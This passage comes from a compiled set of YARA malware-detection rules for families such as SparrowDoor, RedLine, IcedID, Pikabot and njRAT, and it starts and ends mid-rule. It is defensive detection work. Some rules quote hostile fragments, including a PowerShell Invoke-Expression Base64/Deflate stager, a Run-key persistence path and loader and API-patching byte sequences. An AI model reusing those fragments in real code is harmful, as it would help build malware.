		id = "1bdc0b54-4903-559d-9037-450470fc7ef7"
		date = "2020-04-27"
		modified = "2023-04-10"
		reference = "https://research.checkpoint.com/2020/nazar-spirits-of-the-past/"
		source_url = "https://github.com/mikesxrs/Open-Source-YARA-rules/blob/ec0056f767db98bf6d5fd63877ad51fb54d350e9/Checkpoint/apt_nazar_component_guids.yar#L1-L32"
		license_url = "N/A"
		hash = "1110c3e34b6bbaadc5082fabbdd69f492f3b1480724b879a3df0035ff487fd6f"
		hash = "1afe00b54856628d760b711534779da16c69f542ddc1bb835816aa92ed556390"
		hash = "2caedd0b2ea45761332a530327f74ca5b1a71301270d1e2e670b7fa34b6f338e"
		hash = "2fe9b76496a9480273357b6d35c012809bfa3ae8976813a7f5f4959402e3fbb6"
		hash = "460eba344823766fe7c8f13b647b4d5d979ce4041dd5cb4a6d538783d96b2ef8"
		hash = "4d0ab3951df93589a874192569cac88f7107f595600e274f52e2b75f68593bca"
		hash = "75e4d73252c753cd8e177820eb261cd72fecd7360cc8ec3feeab7bd129c01ff6"
		hash = "8fb9a22b20a338d90c7ceb9424d079a61ca7ccb7f78ffb7d74d2f403ae9fbeec"
		hash = "967ac245e8429e3b725463a5c4c42fbdf98385ee6f25254e48b9492df21f2d0b"
		hash = "be624acab7dfe6282bbb32b41b10a98b6189ab3a8d9520e7447214a7e5c27728"
		hash = "d34a996826ea5a028f5b4713c797247913f036ca0063cc4c18d8b04736fa0b65"
		hash = "d9801b4da1dbc5264e83029abb93e800d3c9971c650ecc2df5f85bcc10c7bd61"
		hash = "eb705459c2b37fba5747c73ce4870497aa1d4de22c97aaea4af38cdc899b51d3"
		logic_hash = "9fb69a0ea7272f1b1cbb290ae81e08f7e2b2f6c5409bbca12d9b0b781cb4c267"
		score = 75
		quality = 85
		tags = ""

	strings:
		$guid1_godown = { 98 B3 E5 F6 DF E3 6B 49 A2 AD C2 0F EA 30 DB FE }
		$guid2_godown = { 31 4B CB DB B8 21 0F 4A BC 69 0C 3C E3 B6 6D 00 }
		$guid3_godown = { AF 94 4E B6 6B D5 B4 48 B1 78 AF 07 23 E7 2A B5 }
		$guid4_filesystem = { 79 27 AB 37 34 F2 9D 4D B3 FB 59 A3 FA CB 8D 60 }
		$guid6_filesystem = { 2D A1 2B 77 62 8A D3 4D B3 E8 92 DA 70 2E 6F 3D }
		$guid5_filesystem = { AB D3 13 CF 1C 6A E8 4A A3 74 DE D5 15 5D 6A 88 }

	condition:
		any of them
}

rule CHECK_POINT_Malware_Bumblebee_Packed
{
	meta:
		description = "Detects the packer used by bumblebee, the rule is based on the code responsible for allocating memory for a critical structure in its logic."
		author = "Marc Salinas @ CheckPoint Research"
		id = "35f00c87-c26e-5189-b66d-15d5a1b1dd20"
		date = "2022-07-13"
		modified = "2023-04-10"
		reference = "https://research.checkpoint.com/2022/bumblebee-increasing-its-capacity-and-evolving-its-ttps/"
		source_url = "https://github.com/mikesxrs/Open-Source-YARA-rules/blob/ec0056f767db98bf6d5fd63877ad51fb54d350e9/Checkpoint/malware_bumblebee_packed.yar#L1-L31"
		license_url = "N/A"
		logic_hash = "063209aad7ab8a0be46fd578a16b04afc086f930cbdb6c2f7b02824f704d7330"
		score = 75
		quality = 85
		tags = ""
		malware_family = "BumbleBee"
		dll_jul = "6bc2ab410376c1587717b2293f2f3ce47cb341f4c527a729da28ce00adaaa8db"
		dll_jun = "82aab01a3776e83695437f63dacda88a7e382af65af4af1306b5dbddbf34f9eb"
		dll_may = "a5bcb48c0d29fbe956236107b074e66ffc61900bc5abfb127087bb1f4928615c"
		iso_jul = "ca9da17b4b24bb5b24cc4274cc7040525092dffdaa5922f4a381e5e21ebf33aa"
		iso_jun = "13c573cad2740d61e676440657b09033a5bec1e96aa1f404eed62ba819858d78"
		iso_may = "b2c28cdc4468f65e6fe2f5ef3691fa682057ed51c4347ad6b9672a9e19b5565e"
		zip_jun = "7024ec02c9670d02462764dcf99b9a66b29907eae5462edb7ae974fe2efeebad"
		zip_may = "68ac44d1a9d77c25a97d2c443435459d757136f0d447bfe79027f7ef23a89fce"

	strings:
		$heapalloc = {  
            48 8? EC [1-6]           // sub     rsp, 80h 
            FF 15 ?? ?? 0? 00 [0-5]  // call    cs:GetProcessHeap 
            33 D2                    // xor     edx, edx        ; dwFlags 
            4? [2-5]                 // mov     rcx, rax        ; hHeap 
            4? ?? ??                 // mov     r8d, ebx        ; dwBytes 
            FF 15 ?? ?? 0? 00        // call    cs:HeapAlloc 
            [8 - 11]                 // (load params) 
            48 89 05 ?? ?? ?? 00     // mov     cs:HeapBufferPtr, rax 
            E8 ?? ?? ?? ??           // call    memset 
            4? 8B ?? ?? ?? ?? 00     // mov     r14, cs:HeapBufferPtr 
        }

	condition:
		$heapalloc
}

rule DRAGON_THREAT_LABS_Apt_C16_Win_Wateringhole
{
	meta:
		description = "Detects code from APT wateringhole"
		author = "@dragonthreatlab"
		id = "4958f894-91a7-56b4-90f0-40085c03382c"
		date = "2015-01-11"
		modified = "2016-09-27"
		reference = "http://blog.dragonthreatlabs.com/2015/01/dtl-12012015-01-hong-kong-swc-attack.html"
		source_url = "https://github.com/mikesxrs/Open-Source-YARA-rules/blob/ec0056f767db98bf6d5fd63877ad51fb54d350e9/Dragonthreatlabs/apt_c16_win_wateringhole.yar#L1-L14"
		license_url = "N/A"
		logic_hash = "e866499ec77984f5bacf3f5e352393b63e0dd08fd8fd57b4990292a1dc7fbcbe"
		score = 75
		quality = 80
		tags = ""

	strings:
		$str1 = "function runmumaa()"
		$str2 = "Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String("
		$str3 = "function MoSaklgEs7(k)"

	condition:
		any of ( $str* )
}

rule DRAGON_THREAT_LABS_Apt_Win_Mocelpa
{
	meta:
		description = "APT malware; Mocelpa, downloader."
		author = "@int0x00"
		id = "2cf2ba5e-86b1-5533-9e14-61113e5f574d"
		date = "2023-04-10"
		modified = "2023-04-10"
		reference = "https://github.com/DragonThreatLabs/IntelReports/blob/master/DTL-06282015-01.pdf"
		source_url = "https://github.com/mikesxrs/Open-Source-YARA-rules/blob/ec0056f767db98bf6d5fd63877ad51fb54d350e9/Dragonthreatlabs/apt_win_mocelpa.yar#L1-L11"
		license_url = "N/A"
		logic_hash = "0331c0f690ac7a8870b3f4012f2828ed23850340edcf0b6ff80bc408d9174977"
		score = 75
		quality = 28
		tags = ""

	strings:
		$mz = {4D 5A}
		$ssl_hello = {16 03 01 00 6B 01 00 00 67 03 01 54 B4 C9 7B 4F CF BC 5A 01 EC 4A 73 C8 6D BB C0 86 9F 7B A9 08 6A 60 37 05 81 97 1A C8 9F 45 E5 00 00 18 00 2F 00 35 00 05 00 0A C0 13 C0 14 C0 09 C0 0A 00 32 00 38 00 13 00 04 01 00 00 26 00 00 00 12 00 10 00 00 0D 77 77 77 2E 61 70 70 6C 65 2E 63 6F 6D 00 0A 00 06 00 04 00 17 00 18 00 0B 00 02 01 00}

	condition:
		($mz at 0 ) and ( $ssl_hello )
}

rule NCSC_Sparrowdoor_Sleep_Routine
{
	meta:
		description = "SparrowDoor implements a Sleep routine with value seeded on GetTickCount. This signature detects the previous and this variant of SparrowDoor. No MZ/PE match as the backdoor has no header."
		author = "NCSC"
		id = "9a0aa77d-7dbe-5007-b875-211cf528614b"
		date = "2022-02-28"
		modified = "2022-07-06"
		reference = "https://www.ncsc.gov.uk/files/NCSC-MAR-SparrowDoor.pdf"
		source_url = "https://github.com/mikesxrs/Open-Source-YARA-rules/blob/ec0056f767db98bf6d5fd63877ad51fb54d350e9/NCSC/SparrowDoor_sleep_routine.yar#L1-L12"
		license_url = "N/A"
		logic_hash = "8ae231cb43440e1771d9f7ecaccfedae33f4d14e5ebabd94a909e05bd9fe1bc1"
		score = 75
		quality = 80
		tags = ""
		hash1 = "c1890a6447c991880467b86a013dbeaa66cc615f"

	strings:
		$sleep = {FF D7 33 D2 B9 [4] F7 F1 81 C2 [4] 8B C2 C1 E0 04 2B C2 03 C0 03 C0 03 C0 50}

	condition:
		all of them
}

rule NCSC_Sparrowdoor_Xor
{
	meta:
		description = "Highlights XOR routines in SparrowDoor. No MZ/PE match as the backdoor has no header. Targeting in memory."
		author = "NCSC"
		id = "9c07feea-91fc-528e-91ac-14d09fa1fc10"
		date = "2022-02-28"
		modified = "2022-07-06"
		reference = "https://www.ncsc.gov.uk/files/NCSC-MAR-SparrowDoor.pdf"
		source_url = "https://github.com/mikesxrs/Open-Source-YARA-rules/blob/ec0056f767db98bf6d5fd63877ad51fb54d350e9/NCSC/SparrowDoor_xor.yar#L1-L14"
		license_url = "N/A"
		logic_hash = "3244e9017e5a0bf1c54e03b3191a5c695b2c1586b3ed4c529742f9b48903a348"
		score = 75
		quality = 80
		tags = ""
		hash1 = "c1890a6447c991880467b86a013dbeaa66cc615f"

	strings:
		$xor_routine_outbound = {B8 39 8E E3 38 F7 E1 D1 EA 8D 14 D2 8B C1 2B C2 8A [4] 00 30 14 39 41 3B CE}
		$xor_routine_inbound = {B8 25 49 92 24 F7 E1 8B C1 2B C2 D1 E8 03 C2 C1 E8 02 8D 14 C5 [4] 2B D0 8B C1 2B C2}
		$xor_routine_config = {8B D9 83 E3 07 0F [6] 30 18 8D 1C 07 83 E3 07 0F [6] 30 58 01 8D 1C 28 83 E3 07 0F [6] 30 58 02 8D 1C 02 83 E3 07 0F [6] 30 58 03 8B DE 83 E3 07 0F [6] 30 58 04 83 C6 05 83 C1 05}

	condition:
		2 of them
}

rule NCSC_Sparrowdoor_Apipatch
{
	meta:
		description = "Identifies code segments in SparrowDoor responsible for patching APIs. No MZ/PE match as the backdoor has no header. Targeting in memory."
		author = "NCSC"
		id = "119b7f3a-1850-53ab-a5d1-8882e34a34b4"
		date = "2022-02-28"
		modified = "2022-07-06"
		reference = "https://www.ncsc.gov.uk/files/NCSC-MAR-SparrowDoor.pdf"
		source_url = "https://github.com/mikesxrs/Open-Source-YARA-rules/blob/ec0056f767db98bf6d5fd63877ad51fb54d350e9/NCSC/SparrowDoor_apipatch.yar#L1-L17"
		license_url = "N/A"
		logic_hash = "302ad7fc0354636c57e6ec86876c7d4a5baaa784f5ecf0f2d51ce47631b8542a"
		score = 75
		quality = 80
		tags = ""
		hash1 = "c1890a6447c991880467b86a013dbeaa66cc615f"

	strings:
		$save = {8B 06 89 07 8A 4E 04}
		$vp_1 = {89 10 8A 4E 04 8B D6 2B D0 88 48 04 83 EA 05 C6 40 05 E9 89 50 06}
		$vp_2 = {50 8B D6 6A 40 2B D7 88 4F 04 83 EA 05 6A 05 C6 47 05 E9 89 57 06 56}
		$vp_3 = {51 52 2B DE 6A 05 83 EB 05 56 C6 06 E9 89 5E 01}
		$va = {6A 40 68 00 10 00 00 68 00 10 00 00 6A 00}
		$s_patch = {50 68 7F FF FF FF 68 FF FF 00 00 56}

	condition:
		3 of them
}

rule NCSC_Sparrowdoor_Shellcode
{
	meta:
		description = "Targets code features of the reflective loader for SparrowDoor. Targeting in memory."
		author = "NCSC"
		id = "572187fb-1a11-54f2-9fe7-2b7468b56556"
		date = "2022-02-28"
		modified = "2022-07-06"
		reference = "https://www.ncsc.gov.uk/files/NCSC-MAR-SparrowDoor.pdf"
		source_url = "https://github.com/mikesxrs/Open-Source-YARA-rules/blob/ec0056f767db98bf6d5fd63877ad51fb54d350e9/NCSC/SparrowDoor_shellcode.yar#L1-L15"
		license_url = "N/A"
		logic_hash = "7186bab23114b4825161f58fb02ff397ec8278385482232a4086c86c6fc47082"
		score = 75
		quality = 80
		tags = ""
		hash1 = "c1890a6447c991880467b86a013dbeaa66cc615f"

	strings:
		$peb = {8B 48 08 89 4D FC 8B 51 3C 8B 54 0A 78 8B 74 0A 20 03 D1 03 F1 B3 64}
		$getp_match = {8B 06 03 C1 80 38 47 75 34 80 78 01 65 75 2E 80 78 02 74 75 28 80 78 03 50 75 22 80 78 04 72 75 1C 80 78 06 63 75 16 80 78 05 6F 75 10 80 78 07 41 75 0A}
		$k_check = {8B 48 20 8A 09 80 F9 6B 74 05 80 F9 4B 75 05}
		$resolve_load_lib = {C7 45 C4 4C 6F 61 64 C7 45 C8 4C 69 62 72 C7 45 CC 61 72 79 41 C7 45 D0 00 00 00 00 FF 75 FC FF 55 E4}

	condition:
		3 of them
}

rule NCSC_Sparrowdoor_Strings
{
	meta:
		description = "Strings that appear in SparrowDoor’s backdoor. Targeting in memory."
		author = "NCSC"
		id = "6f96a577-fb59-57db-a66a-f514ecfbf982"
		date = "2022-02-28"
		modified = "2022-07-06"
		reference = "https://www.ncsc.gov.uk/files/NCSC-MAR-SparrowDoor.pdf"
		source_url = "https://github.com/mikesxrs/Open-Source-YARA-rules/blob/ec0056f767db98bf6d5fd63877ad51fb54d350e9/NCSC/SparrowDoor_strings.yar#L1-L23"
		license_url = "N/A"
		logic_hash = "65ec5d266ecd81ab8e4cfbcb352173f825bdae92fd4737b577cb209bace2a943"
		score = 75
		quality = 80
		tags = ""
		hash1 = "c1890a6447c991880467b86a013dbeaa66cc615f"

	strings:
		$reg = "Software\\Microsoft\\Windows\\CurrentVersion\\Run" ascii
		$http_headers = {55 73 65 72 2D 41 67 65 6E 74 3A 20 4D 6F 7A 69 6C 6C 61 2F 34 2E 30 20 28 63 6F 6D 70 61 74 69 62 6C 65 3B 20 4D 53 49 45 20 35 2E 30 3B 20 57 69 6E 64 6F 77 73 20 4E 54 20 35 2E 30 29 0D 0A 41 63 63 65 70 74 2D 4C 61 6E 67 75 61 67 65 3A 20 65 6E 2D 55 53 0D 0A 41 63 63 65 70 74 3A 20 2A 2F 2A 0D 0A}
		$http_proxy = "HTTPS=HTTPS://%s:%d" ascii
		$debug = "SeDebugPrivilege" ascii
		$av1 = "avp.exe" ascii
		$av2 = "ZhuDongFangYu.exe" ascii
		$av3 = "egui.exe" ascii
		$av4 = "TMBMSRV.exe" ascii
		$av5 = "ccSetMgr.exe" ascii
		$clipshot = "clipshot" ascii
		$ComSpec = "ComSpec" ascii
		$export = "curl_easy_init" ascii

	condition:
		10 of them
}

rule EMBEERESEARCH_Win_Redline_Updated_Bytecodes_Oct_2023
{
	meta:
		description = "Configuration related bytecodes in redline .net files"
		author = "Matthew @ Embee_Research"
		id = "1e4470cf-fad3-57e5-8a95-deb97e98dbdc"
		date = "2023-10-11"
		modified = "2023-10-11"
		reference = "https://github.com/embee-research/Yara-detection-rules/"
		source_url = "https://github.com/embee-research/Yara-detection-rules//blob/ac56d6f6fd2a30c8cb6e5c0455d6519210a8b0f4/Rules/win_redline_bytecodes_oct_2023.yar#L2-L35"
		license_url = "N/A"
		hash = "0cc3a0f8b48ef8d8562b9cdf9c7cfe7f63faf43a5ac6dc6973dc8bf13b6c88cf"
		logic_hash = "77273ba3736baf2c197fb8b17de1e22ba8f2380f73f9114f324ef56bfa508654"
		score = 75
		quality = 75
		tags = ""

	strings:
		$s_1 = {   
				20 ?? ?? ?? ?? 											// ldc.i4
				2B 00       											// br.s
				28 ?? ?? ?? 2B 											// Call
				80 ?? ?? ?? 04 											// stsfld
				(20 ?? ?? ?? ?? 2B00 28 ?? ?? ?? 2B | 72 ?? ?? ?? 70)   // ldc.i4, br.s, call OR ldstr
				80 ?? ?? ?? 04      									// Call
				(20 ?? ?? ?? ?? 2B00 28 ?? ?? ?? 2B | 72 ?? ?? ?? 70)   // ldc.i4, br.s, call OR ldstr
				80 ?? ?? ?? 04 											// Call		
				20 ?? ?? ?? ?? 											// ldc.i4
				2B00            										// br.s
				28 ?? ?? ?? 2B      									// Call
				80 ?? ?? ?? 04 											// stsfld
				2A 														// ret
			}
		$s_2 = "mscoree.dll"

	condition:
		$s_1 and $s_2
}

rule EMBEERESEARCH_Win_Ursnif_Patterns_Oct_2022
{
	meta:
		description = "No description has been set in the source file - EmbeeResearch"
		author = "Embee_Research @ Huntress"
		id = "2c8da2b7-63f2-5cce-86ab-8a88f50d0263"
		date = "2022-10-14"
		modified = "2023-06-14"
		reference = "https://github.com/embee-research/Yara-detection-rules/"
		source_url = "https://github.com/embee-research/Yara-detection-rules//blob/ac56d6f6fd2a30c8cb6e5c0455d6519210a8b0f4/Rules/win_ursnif_patterns_oct_2022.yar#L1-L14"
		license_url = "N/A"
		logic_hash = "241804ea3b7ac98071c533d9a98a45cdd0f7043f11994327c1f79e29f5fdce2c"
		score = 75
		quality = 75
		tags = ""

	strings:
		$ursnif = {41 c1 e8 02 45 33 d2 45 8b d9 45 85 c0 74 2f 48 2b ca 83 7c 24 28 00 8b 04 11 44 8b c8 74 0a 85 c0 75 06 44 8d 40 01}
		$script = "65,193,232,2,69,51,210,69,139,217,69,133,192,116,47,72,43,202,131,124,36,40,0,139,4,17,68,139,200,116,10,133,192,117,6,68,141,64,1"

	condition:
		any of them
}

rule EMBEERESEARCH_Win_Icedid_Snowloader_Bytecodes_Oct_2023
{
	meta:
		description = "No description has been set in the source file - EmbeeResearch"
		author = "Matthew @ Embee_Research"
		id = "ad5d7bf5-813d-519d-91ae-e6a69fd557df"
		date = "2023-08-27"
		modified = "2023-10-18"
		reference = "https://github.com/embee-research/Yara-detection-rules/"
		source_url = "https://github.com/embee-research/Yara-detection-rules//blob/ac56d6f6fd2a30c8cb6e5c0455d6519210a8b0f4/Rules/win_icedid_snowloader_bytecodes_oct_2023.yar#L2-L23"
		license_url = "N/A"
		hash = "e096de90f65ff83ed0e929b330aa765a8e2322625325fb042775bff1748467cc"
		hash = "e87928fcddf13935c91a0b5577e28efd29bb6a5c1d98e5129dec63e231601053"
		hash = "82a01607ebdcaa73b9ff201ccb76780ad8de4a99dd3df026dcb71b0f007456ed"
		logic_hash = "5baa308ce130cbbe80f94fc127b083f26ae87552910c2bc6f3bae3008cf1aa63"
		score = 75
		quality = 75
		tags = ""

	strings:
		$s_1 = {4c 77 26 07}
		$s_2 = {58 a4 53 e5}
		$s_3 = {10 e1 8a c3}

	condition:
		( all of ( $s* ) ) and pe.number_of_exports > 20
}

rule EMBEERESEARCH_Win_Pikabot_Resource_Entropy_Oct_2023
{
	meta:
		description = "Pikabot Loaders embedding encrypted inside of numerous png images"
		author = "Matthew @ Embee_Research"
		id = "253d35ae-a325-51c7-8da5-32bb46c51acd"
		date = "2023-10-03"
		modified = "2023-10-08"
		reference = "https://github.com/embee-research/Yara-detection-rules/"
		source_url = "https://github.com/embee-research/Yara-detection-rules//blob/ac56d6f6fd2a30c8cb6e5c0455d6519210a8b0f4/Rules/win_pikabot_resource_entropy_oct_2023.yar#L5-L40"
		license_url = "N/A"
		hash = "936247d9a0ce76bed17f03430186abb9ecafa88ef3a968cdd46c5b0a24a5cc3f"
		hash = "2c7b7c3ec8a6a835e07c8feed401460e185388f59ea5fc8aa8038d2b75815666"
		hash = "00239c55d7135aa06e21ace557a3e8bf3818c2e07051c84753209e7348b6a426"
		hash = "5f218eeb83c936d88b65ec3f3052d8c53f58775dacc04bedc91bd388fb7bb885"
		hash = "6bea3ecd1f43bdcc261719fb732fcf27e82ed6f4b086616925291a733f358a26"
		hash = "966042f3e532b6abce7d96bbdb91dc4561b32a4b0b9eec7b08b4f1024c2da916"
		hash = "951c906a1fa179050d30c06849d42e49a295dd1baad91efb244b2e5486b5801d"
		hash = "a06bd2623c389f2547d0bf750ca720ab7a74c90982267aad49ba31d5de345288"
		hash = "aeb2bf8898636b572b0703d9ddb90b9a4c5c6db9eee631ee726ad753f197ac12"
		logic_hash = "7beec034fc927990734691bd6859870921027860c0591c7a0d5a3815f919112d"
		score = 75
		quality = 50
		tags = ""

	strings:
		$s1 = "ARROW-DOWN" wide
		$s2 = "ARROW-LEFT" wide
		$s3 = "ARROW-RIGHT" wide

	condition:
		pe.DLL and ( all of ( $s* ) ) and pe.number_of_resources > 25 and pe.sections [ 3 ] . raw_data_size > 400KB and math.entropy ( pe.sections [ 3 ] . raw_data_offset , pe.sections [ 3 ] . raw_data_size ) > 7.5
}

rule EMBEERESEARCH_Win_Xworm_Bytestring
{
	meta:
		description = "Detects bytestring present in unobfuscated xworm"
		author = "Matthew @ Embee_Research"
		id = "b7bad89d-ff15-50ae-8c97-64b181dad07f"
		date = "2023-08-27"
		modified = "2023-10-18"
		reference = "https://github.com/embee-research/Yara-detection-rules/"
		source_url = "https://github.com/embee-research/Yara-detection-rules//blob/ac56d6f6fd2a30c8cb6e5c0455d6519210a8b0f4/Rules/win_xworm_bytestring_sep_2023.yar#L3-L24"
		license_url = "N/A"
		hash = "8948b34d471db1e334e6caa00492bd11a60d0ec378933386b0cb7bc1b971c102"
		hash = "52634ade55558807042eae35e2777894e405e811102e980a2e2b25d151fde121"
		logic_hash = "dd9955c3616ee65cf94625f5fc92298464a9a3b6deaf32ae70d7e8206c0ceb5b"
		score = 50
		quality = 75
		tags = ""

	strings:
		$p1 = { 72 [4] 16 28 [4] 16 33 ?? 72 [4] 0C 38 [4] 11 ?? 72 [4] 16 28 [4] 16 33 ?? 72 [4] 0C 38 [4] 11 ?? 72 [4] 16 28 [4] 16 33 ?? 72 [4] 0C 38 [4] 11 ?? 72 [4] 16 28 [4] 16 33 ?? }

	condition:
		dotnet.is_dotnet and $p1
}

rule EMBEERESEARCH_Win_Redline_Payload_Dec_2023
{
	meta:
		description = "Patterns observed in redline"
		author = "Matthew @ Embee_Research"
		id = "6208779a-69b2-55b5-9744-987575c00d96"
		date = "2023-12-24"
		modified = "2023-12-29"
		reference = "https://github.com/embee-research/Yara-detection-rules/"
		source_url = "https://github.com/embee-research/Yara-detection-rules//blob/ac56d6f6fd2a30c8cb6e5c0455d6519210a8b0f4/Rules/win_redline_payload_dec_2023.yar#L1-L16"
		license_url = "N/A"
		hash = "5790aead07ce0b9b508392b9a2f363ef77055ae16c44231773849c87a1dd15a4"
		logic_hash = "d016baa5017120a3037e9cef7fd649228f7be60e511ecbdedf97916f59eec881"
		score = 75
		quality = 75
		tags = ""

	strings:
		$s1 = {16 72 ?? ?? ?? 70 A2 7E ?? ?? ?? 04 17 72 ?? ?? ?? 70 7E ?? ?? ?? 04 16 9A 28 ?? ?? ?? 06 A2 7E ?? ?? ?? 04 18 72 ?? ?? ?? 70 }

	condition:
		all of them
}

rule EMBEERESEARCH_Win_Orcus_Rat_Simple_Strings_Dec_2023
{
	meta:
		description = "Strings observed in Orcus RAT"
		author = "Matthew @ Embee_Research"
		id = "baef6b96-bf94-5363-9186-9761a8055afd"
		date = "2023-12-24"
		modified = "2023-12-24"
		reference = "https://github.com/embee-research/Yara-detection-rules/"
		source_url = "https://github.com/embee-research/Yara-detection-rules//blob/ac56d6f6fd2a30c8cb6e5c0455d6519210a8b0f4/Rules/win_orcus_rat_simple_strings_dec_2023.yar#L1-L26"
		license_url = "N/A"
		hash = "30a2a674d55d7898d304713dd2f69a043d875230ea7ebee22596ba4c640768db"
		logic_hash = "2e0a44ec2749e0fc646dfb003a2d32b3fecfa07ece72ca5a65116250d80496b8"
		score = 75
		quality = 75
		tags = ""

	strings:
		$s1 = "Orcus is a Remote Administration Tool for Windows. It allows the administrator to make changes to the system remotely." wide
		$s2 = "Orcus.Service" wide
		$s4 = "costura.orcus" wide
		$s5 = "Orcus.Commands"
		$s6 = "Orcus.Shared"
		$s7 = "Orcus.Utilities"
		$s8 = "Orcus.StaticCommands"
		$s9 = "Orcus.Plugins"

	condition:
		(5 of them )
}

rule EMBEERESEARCH_Win_Redline_Loader_Dec_2023
{
	meta:
		description = "Patterns observed in redline loader"
		author = "Matthew @ Embee_Research"
		id = "59d933a8-8ccd-565f-b379-e0bf6c3d3111"
		date = "2023-12-24"
		modified = "2023-12-29"
		reference = "https://github.com/embee-research/Yara-detection-rules/"
		source_url = "https://github.com/embee-research/Yara-detection-rules//blob/ac56d6f6fd2a30c8cb6e5c0455d6519210a8b0f4/Rules/win_redline_loader_dec_2023.yar#L1-L20"
		license_url = "N/A"
		hash = ""
		logic_hash = "831c32f9998b97f7ceeb14df73a264a998df5f8800aaa5271755aaaeac070010"
		score = 75
		quality = 75
		tags = ""

	strings:
		$s1 = {8b ?? ?? 0c 30 04 31 46 3b f7 7c ?? 5d 5b 5e 83 ?? ?? 75}
		$s2 = "WritePrivateProfileStringA"
		$s3 = "SetFileShortNameA"
		$s4 = "- Attempt to use MSIL code from this assembly during native code initialization"

	condition:
		all of them
}

rule EMBEERESEARCH_Win_Njrat_Bytecodes_Oct_2023
{
	meta:
		description = ""
		author = "Matthew @ Embee_Research"
		id = "9e39587a-e878-5f99-806f-e9964952f0ac"
		date = "2023-10-03"
		modified = "2023-10-03"
		reference = "https://github.com/embee-research/Yara-detection-rules/"
		source_url = "https://github.com/embee-research/Yara-detection-rules//blob/ac56d6f6fd2a30c8cb6e5c0455d6519210a8b0f4/Rules/win_njrat_bytecodes_oct_2023.yar#L3-L22"
		license_url = "N/A"
		hash = "59d6e2958780d15131c102a93fefce6e388e81da7dc78d9c230aeb6cab7e3474"
		hash = "4c56ade4409add1d78eac3b202a9fbd6afbd71878c31f798026082467ace2628"
		hash = "d5a78790a1b388145424327e78f019584466d30d2d450bba832c0128aa3cd274"
		logic_hash = "7df39219e2f2da55e461b1536e92ab125d488a048e41daaaa1fb9516be395d10"
		score = 75
		quality = 75
		tags = ""

	strings:
		$s1 = {14 80 ?? ?? ?? ?? 16 80 ?? ?? ?? ?? 72 ?? ?? ?? ?? 80 ?? ?? ?? ?? 14 80 ?? ?? ?? ?? 73 ?? ?? ?? ?? 80 ?? ?? ?? ?? 20 ?? ?? ?? ?? 8D ?? ?? ?? ?? 80 ?? ?? ?? ?? 72 ?? ?? ?? ?? 80 ?? ?? ?? ?? 14 80 ?? ?? ?? ?? 2A }

	condition:
		dotnet.is_dotnet and $s1
}

rule EMBEERESEARCH_Win_Marsstealer_Encryption_Bytecodes
{
	meta:
		description = "Encryption observed in MarsStealer"
		author = "Matthew @ Embee_Research"
		id = "7a66ea9c-966e-5780-8b36-a268904b9c1b"
		date = "2023-12-24"
		modified = "2023-12-24"
		reference = "https://github.com/embee-research/Yara-detection-rules/"
		source_url = "https://github.com/embee-research/Yara-detection-rules//blob/ac56d6f6fd2a30c8cb6e5c0455d6519210a8b0f4/Rules/win_marsStealer_encryption_bytecodes_dec_2023.yar#L1-L16"
		license_url = "N/A"
		hash = "7a391340b6677f74bcf896b5cc16a470543e2a384049df47949038df5e770df1"
		logic_hash = "49ffde28c8823c00959ddbaa516fc48c7908b533c8f91608b0e3a645045c9048"
		score = 75
		quality = 75
		tags = ""

	strings:
		$s1 = {31 2d 3d 31 73 30 02 39 c0 74 0a 5b 70 61 73 64 6c 30 71 77 69 8d 5b 01 8d 52 01 39 eb 75 03 83 eb 20 39 ca}

	condition:
		$s1
}

rule EMBEERESEARCH_Win_Solarmarker_Stage2_Bytecodes_Dec_2023
{
	meta:
		description = "Patterns observed in Solarmarker stage2 dll"
		author = "Matthew @ Embee_Research"
		id = "9aba6cdf-1491-579d-b4a7-fe229272015d"
		date = "2023-12-28"
		modified = "2023-12-28"
		reference = "https://github.com/embee-research/Yara-detection-rules/"
		source_url = "https://github.com/embee-research/Yara-detection-rules//blob/ac56d6f6fd2a30c8cb6e5c0455d6519210a8b0f4/Rules/win_solarmarker_stage2_bytecodes_dec_2023.yar#L1-L20"
		license_url = "N/A"
		hash = "4a3b60496a793ee96a51fecf8690ef8312429a6b54d32f2a4424395c47b47fc8"
		hash = "e0b2457491a8c2d50710aa343ad1957a76f83ceaf680165ffa0e287fe18abbd6"
		logic_hash = "8e50e5942f0029ffda1d9750f8cc8e004a2512e50b6a14c1619ae0b83477a944"
		score = 75
		quality = 75
		tags = ""

	strings:
		$s1 = {6F ?? ?? 00 0A 1F 20 2E ?? 02 7B ?? ?? 00 04 02 7B ?? ?? 00 04 6F ?? ?? 00 0A 1F 09 2E ?? 02 7B ?? ?? 00 04 02 7B ?? ?? 00 04 6F ?? ?? 00 0A 1F 0A 2E ?? 02 7B ?? ?? 00 04 02 7B ?? ?? 00 04 6F ?? ?? 00 0A 1F 0D 2E ?? 02 7B ?? ?? 00 04 02 7B ?? ?? 00 04 6F ?? ?? 00 0A 1F 0A }

	condition:
		$s1
}

rule EMBEERESEARCH_Win_Berbew_Strings_Dec_2023
{
	meta:
		description = "Strings observed in Berbew malware."
		author = "Matthew @ Embee_Research"
		id = "402711af-c543-5c95-ae9e-e663825b6653"
		date = "2023-12-24"
		modified = "2023-12-26"
		reference = "https://github.com/embee-research/Yara-detection-rules/"
		source_url = "https://github.com/embee-research/Yara-detection-rules//blob/ac56d6f6fd2a30c8cb6e5c0455d6519210a8b0f4/Rules/win_berbew_strings_dec_2023.yar#L1-L19"
		license_url = "N/A"
		hash = "24dc0af3c51118697df999d8bffcdfc9cbf0d07f2630473450dd826a1ae4b9ae"
		logic_hash = "a7f687e749ec69961777063d52678461a8e288c80037fac051d7b1a5b568d9e8"
		score = 75
		quality = 75
		tags = ""

	strings:
		$s1 = "This KEWL STUFF was coded by V. V. PUPKIN"
		$s2 = "REAL CASH, REAL BITCHEZ"
		$s3 = "Please, enter your Card Number"

	condition:
		all of them
}

rule EMBEERESEARCH_Win_Darkgate_Xllloader_Oct_2023
{
	meta:
		description = "Detects XLL Files Related to DarkGate"
		author = "Matthew @ Embee_Research"
		id = "4b5d9a2d-90ee-5452-83be-1677e1888045"
		date = "2023-10-03"
		modified = "2023-10-04"
		reference = "https://github.com/embee-research/Yara-detection-rules/"
		source_url = "https://github.com/embee-research/Yara-detection-rules//blob/ac56d6f6fd2a30c8cb6e5c0455d6519210a8b0f4/Rules/win_darkgate_xll_loader_oct_2023.yar#L2-L23"
		license_url = "N/A"
		hash = "091b7c16791cf976e684fe22ee18a4099a4e26ec75fa145b85dd14603b466b00"
